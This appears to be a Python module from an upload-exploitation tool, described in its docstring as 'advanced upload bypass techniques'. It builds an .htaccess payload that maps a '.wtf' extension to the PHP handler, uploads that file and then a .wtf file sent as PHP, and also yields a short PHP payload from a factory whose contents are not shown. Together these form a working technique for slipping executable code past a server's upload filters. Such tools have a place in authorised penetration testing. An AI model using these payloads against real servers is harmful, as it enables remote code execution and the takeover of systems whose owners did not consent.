"""Advanced upload bypass techniques."""

from __future__ import annotations

from collections.abc import Iterable

from .models import Payload
from .payloads import PayloadFactory

HTACCESS_PAYLOAD = b"AddType application/x-httpd-php .wtf"


def technique_htaccess_bypass(factory: PayloadFactory) -> Iterable[Payload]:
    yield factory.create(
        "",
        filename=".htaccess",
        content_type="application/x-php",
        data=HTACCESS_PAYLOAD,
        mutate_extension_case=False,
    )
    yield factory.create(".wtf", content_type="application/x-php")


def technique_short_php_payload(factory: PayloadFactory) -> Iterable[Payload]:
    yield factory.short_php_payload()
